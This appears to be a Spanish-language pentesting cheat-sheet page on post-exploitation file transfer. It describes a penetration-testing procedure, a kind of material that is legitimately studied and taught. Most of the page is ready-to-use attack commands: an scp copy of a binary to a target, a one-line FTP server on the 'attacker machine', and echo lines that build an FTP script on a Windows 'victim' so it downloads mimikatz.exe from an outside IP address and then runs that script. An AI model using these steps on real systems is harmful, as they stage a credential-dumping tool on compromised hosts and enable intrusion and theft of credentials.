---
layout: article
title: Pentesting - Post-explotación
aside:
  toc: true
sidebar:
  nav: side
header:
  theme: dark
  background: black
---

<h2>Transferencia de información</h2>

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">SSH</div>
</div>

~~~bash
scp <binario> <user>@<ip>:/tmp
~~~

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">FTP</div>
</div>

**Máquina Atacante**

Levantar un servidor FTP en la máquina atacante:
~~~bash
pip3 install pyftpdlib ; python3 -m pyftpdlib -p 21
~~~

**Máquina Víctima**

Guardar comandos FTP en un fichero dentro del sistema Windows:

~~~bash
echo open 192.168.1.150 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
~~~

Ejecutar comandos ftp para descargar el binario:

~~~bash
ftp -n -v -s:ftp.txt"
~~~

<h2>Recursos adicionales</h2>

[https://book.hacktricks.xyz/exfiltration](https://book.hacktricks.xyz/exfiltration)